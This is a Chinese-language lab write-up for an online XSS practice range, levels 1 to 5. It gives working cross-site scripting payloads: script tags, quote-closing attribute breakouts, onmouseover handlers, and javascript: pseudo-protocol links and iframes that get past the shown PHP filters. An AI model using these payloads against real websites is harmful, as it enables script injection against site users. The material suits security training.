# xss平台练习

> 来源为一个在线靶场：
>
> http://test.ctf8.com/level1.php?name=test

## level1

<script>alert('xss')</script>

## level2

过滤php函数

(PHP 4, PHP 5, PHP 7)

htmlspecialchars — 将特殊字符转换为 HTML 实体

等于<不能用，这时候一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：

![image-20200915193548678](未命名.assets/image-20200915193548678.png)

![image-20200915194446612](未命名.assets/image-20200915194446612.png)

Payload:

"><script>alert(1)</script>

这样value=" "，不会检查我们的弹窗代码

![image-20200915201010853](未命名.assets/image-20200915201010853.png)

## level3

![image-20200915201317764](未命名.assets/image-20200915201317764.png)

Payload: 

' onmouseover=alert(1)//

单引号用来闭合，

### 定义和用法

onmouseover 事件会在鼠标指针移动到指定的对象上时发生。这里指定的就是搜索框了。

## less4

跟3一样，不过要用""进行闭合。

## less5

~~~javascript
$str = strtolower($_GET["keyword"]); //将字符串转化为小写，所以大小写不能绕过
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
~~~

对输入进行了过滤。

但是没有对<>进行过滤，所以我们可以使用伪协议来进行构造

payload:

~~~
"><iframe src=javascript:alert(1)>
"> <a href="javascript:alert(1)">bmjoker</a>
"> <a href="javascript:%61lert(1)">bmjoker</a> //
~~~

iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。

其中第二第三个payload是定义了一个链接，在访问时触发js代码。

